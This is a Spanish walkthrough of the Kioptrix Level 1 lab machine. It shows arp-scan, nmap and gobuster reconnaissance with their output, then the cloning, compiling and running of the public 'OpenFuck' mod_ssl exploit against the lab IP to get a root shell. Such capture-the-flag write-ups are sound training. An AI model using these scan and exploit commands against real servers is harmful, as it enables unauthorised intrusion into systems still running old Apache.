# Kioptrix Level 1 Walkthrough


# Kioptrix: Level 1

## Instalación

Si iniciamos la maquina por defecto la tarjeta de red esta en modo brigded y esto no es para nada recomendable por lo que debemos cambiarlo a modo NAT para ello debemos ir al archivo de configuración ubicado en la carpeta de la maquina

![Untitled](Untitled.png)

Buscamos Donde ponga Brigded y lo cambiamos por NAT

![Untitled](Untitled%201.png)

```bash
#cambiar
ethernet0.networkName = "Bridged"
#por
ethernet0.networkName = "NAT"
```

Después configuramos nuestra tarjeta de red como NAT e iniciamos.

## Resolución de Maquina
### Analisis de vulnerabilidades
Empezamos con un escaneo a la red local a través de arp-scan.

Introducimos la interfaz (eth0) que se comunica con la maquina Kioptrix.

```bash
arp-scan -I eth0 --localnet
```

![Untitled](Untitled%202.png)

A continuación realizamos un escaneo con nmap.

```bash
nmap -p- --open  -T5 -n -Pn -vvv 192.168.66.158 -oN Target
```

![Untitled](Untitled%203.png)

Tras un primer escaneo pasamos a realizar otro para ver la versión de los servicios de los puertos abiertos.

```bash
nmap -p22,80,111,139,443,1024 -sCV 192.168.66.158
```

Output:

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-10 17:57 EDT
Nmap scan report for 192.168.66.158
Host is up (0.00024s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8746cdbfd8be666e92a2bdf5e6f6486 (RSA1)
|   1024 8f8e5b81ed21abc180e157a33c85c471 (DSA)
|_  1024 ed4ea94a0614ff1514ceda3a80dbe281 (RSA)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2023-08-10T22:00:06+00:00; +1m50s from scanner time.
|_http-title: 400 Bad Request
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:7C:3A:16 (VMware)

Host script results:
|_clock-skew: 1m49s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.02 seconds
```

Nos fijamos que tiene los puertos 80 Y 443 abiertos, y que tiene una versión de apache 1.3.20 con una versión mod_ssl de 2.8.4.

Pasamos a ver las webs con el navegador

```bash
http://192.168.66.158
```
![Untitled](Untitled%204.png)

Tras una revisión a la web y a su código fuente no encontramos nada de interés por lo que pasamos a revisar la web con el puerto 443.

```bash
http://192.168.66.158:443
```
![Untitled](Untitled%205.png)

Tampoco se ve nada interesante.

A continuación he realizado un ataque de fuerza bruta a directorios con gobuster.

```bash
gobuster dir -u "http://192.168.66.158/" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Output:

```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.66.158/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/10 17:55:28 Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
/usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]
/mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]
Progress: 219977 / 220561 (99.74%)
===============================================================
2023/08/10 17:56:39 Finished
===============================================================
```

Pero no he podido acceder a ningún directorio ya que soy redirigido a urls locales de la maquina.
Tras buscar con searchsploit la versión de Apache obtenemos el siguiente resultado:

![Untitled](Untitled%206.png)

Nos interesa los exploits en los que pone mod_ssl, pero al compilarlos dan errores por lo que hemos pasado a buscar la versión de apache y mod_ssl en Google en busca de exploits y encontramos la siguiente pagina de GitHub con el archivo en .c modificado el cual no da problemas de compilación.

```bash
https://github.com/heltonWernik/OpenLuck
```

Clonamos el repositorio en nuestra maquina:

```bash
git clone https://github.com/heltonWernik/OpenFuck.git
```

Instalamos las librerías necesarias

```bash
apt-get install libssl-dev
```

Compilamos

```bash
gcc -o OpenFuck OpenFuck.c -lcrypto
```
### Explotacion

Ejecutamos el exploit

```bash
./OpenFuck
```

Output

```bash
./OpenFuck                    

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenFuckV2 target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
        0x00 - Caldera OpenLinux (apache-1.3.26)
        0x01 - Cobalt Sun 6.0 (apache-1.3.12)
        0x02 - Cobalt Sun 6.0 (apache-1.3.20)
        0x03 - Cobalt Sun x (apache-1.3.26)
        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)
        0x05 - Conectiva 4 (apache-1.3.6)
        0x06 - Conectiva 4.1 (apache-1.3.9)
        0x07 - Conectiva 6 (apache-1.3.14)
        0x08 - Conectiva 7 (apache-1.3.12)
        0x09 - Conectiva 7 (apache-1.3.19)
        0x0a - Conectiva 7/8 (apache-1.3.26)
        0x0b - Conectiva 8 (apache-1.3.22)
        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)
        0x0d - Debian GNU Linux (apache_1.3.19-1)
        0x0e - Debian GNU Linux (apache_1.3.22-2)
        0x0f - Debian GNU Linux (apache-1.3.22-2.1)
        0x10 - Debian GNU Linux (apache-1.3.22-5)
        0x11 - Debian GNU Linux (apache_1.3.23-1)
        0x12 - Debian GNU Linux (apache_1.3.24-2.1)
        0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)
        0x14 - Debian GNU Linux (apache_1.3.24-3)
        0x15 - Debian GNU Linux (apache-1.3.26-1)
        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)
        0x17 - Debian GNU Linux (apache-1.3.27)
        0x18 - FreeBSD (apache-1.3.9)
        0x19 - FreeBSD (apache-1.3.11)
        0x1a - FreeBSD (apache-1.3.12.1.40)
        0x1b - FreeBSD (apache-1.3.12.1.40)
        0x1c - FreeBSD (apache-1.3.12.1.40)
        0x1d - FreeBSD (apache-1.3.12.1.40_1)
        0x1e - FreeBSD (apache-1.3.12)
        0x1f - FreeBSD (apache-1.3.14)
        0x20 - FreeBSD (apache-1.3.14)
        0x21 - FreeBSD (apache-1.3.14)
        0x22 - FreeBSD (apache-1.3.14)
        0x23 - FreeBSD (apache-1.3.14)
        0x24 - FreeBSD (apache-1.3.17_1)
        0x25 - FreeBSD (apache-1.3.19)
        0x26 - FreeBSD (apache-1.3.19_1)
        0x27 - FreeBSD (apache-1.3.20)
        0x28 - FreeBSD (apache-1.3.20)
        0x29 - FreeBSD (apache-1.3.20+2.8.4)
        0x2a - FreeBSD (apache-1.3.20_1)
        0x2b - FreeBSD (apache-1.3.22)
        0x2c - FreeBSD (apache-1.3.22_7)
        0x2d - FreeBSD (apache_fp-1.3.23)
        0x2e - FreeBSD (apache-1.3.24_7)
        0x2f - FreeBSD (apache-1.3.24+2.8.8)
        0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)
        0x31 - FreeBSD 4.6-Realease (apache-1.3.26)
        0x32 - FreeBSD (apache-1.3.27)
        0x33 - Gentoo Linux (apache-1.3.24-r2)
        0x34 - Linux Generic (apache-1.3.14)
        0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)
        0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)
        0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)
        0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)
        0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2
        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
        0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)
        0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)
        0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)
        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
        0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)
        0x41 - Mandrake Linux 8.2 #2 (apache-1.3.23-4)
        0x42 - Mandrake Linux 8.2 (apache-1.3.24)
        0x43 - Mandrake Linux 9 (apache-1.3.26)
        0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)
        0x45 - RedHat Linux TEST1 (apache-1.3.12-1)
        0x46 - RedHat Linux TEST2 (apache-1.3.12-1)
        0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)
        0x48 - RedHat Linux 4.2 (apache-1.1.3-3)
        0x49 - RedHat Linux 5.0 (apache-1.2.4-4)
        0x4a - RedHat Linux 5.1-Update (apache-1.2.6)
        0x4b - RedHat Linux 5.1 (apache-1.2.6-4)
        0x4c - RedHat Linux 5.2 (apache-1.3.3-1)
        0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)
        0x4e - RedHat Linux 6.0 (apache-1.3.6-7)
        0x4f - RedHat Linux 6.0 (apache-1.3.6-7)
        0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)
        0x51 - RedHat Linux 6.0 Update (apache-1.3.24)
        0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1
        0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2
        0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)
        0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)
        0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1
        0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2
        0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3
        0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1
        0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2
        0x5b - Redhat Linux 7.x (apache-1.3.22)
        0x5c - RedHat Linux 7.x (apache-1.3.26-1)
        0x5d - RedHat Linux 7.x (apache-1.3.27)
        0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1
        0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2
        0x60 - RedHat Linux 7.0 (apache-1.3.14-2)
        0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)
        0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)
        0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)
        0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1
        0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2
        0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)
        0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)
        0x68 - RedHat Linux 7.1 (apache-1.3.22-src)
        0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)
        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
        0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)
        0x6d - RedHat Linux 7.2 (apache-1.3.24)
        0x6e - RedHat Linux 7.2 (apache-1.3.26)
        0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)
        0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1
        0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2
        0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)
        0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1
        0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2
        0x75 - RedHat Linux 7.3 (apache-1.3.27)
        0x76 - RedHat Linux 8.0 (apache-1.3.27)
        0x77 - RedHat Linux 8.0-second (apache-1.3.27)
        0x78 - RedHat Linux 8.0 (apache-2.0.40)
        0x79 - Slackware Linux 4.0 (apache-1.3.6)
        0x7a - Slackware Linux 7.0 (apache-1.3.9)
        0x7b - Slackware Linux 7.0 (apache-1.3.26)
        0x7c - Slackware 7.0  (apache-1.3.26)2
        0x7d - Slackware Linux 7.1 (apache-1.3.12)
        0x7e - Slackware Linux 8.0 (apache-1.3.20)
        0x7f - Slackware Linux 8.1 (apache-1.3.24)
        0x80 - Slackware Linux 8.1 (apache-1.3.26)
        0x81 - Slackware Linux 8.1-stable (apache-1.3.26)
        0x82 - Slackware Linux (apache-1.3.27)
        0x83 - SuSE Linux 7.0 (apache-1.3.12)
        0x84 - SuSE Linux 7.1 (apache-1.3.17)
        0x85 - SuSE Linux 7.2 (apache-1.3.19)
        0x86 - SuSE Linux 7.3 (apache-1.3.20)
        0x87 - SuSE Linux 8.0 (apache-1.3.23)
        0x88 - SUSE Linux 8.0 (apache-1.3.23-120)
        0x89 - SuSE Linux 8.0 (apache-1.3.23-137)
        0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)

Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
```

Como podemos ver hay diferentes versiones de apache para diferentes versiones de Gnu/linux tras unos intentos comprobamos que la opción correcta es 0x6b 

```bash
./openfuck 0x6b 192.168.66.158 -c 45
```

![Untitled](Untitled%207.png)

Obtenemos una Shell con permisos root por lo que no es necesario escalar privilegios.

Con esto terminamos la maquina.

Un saludo y Feliz Hacking.

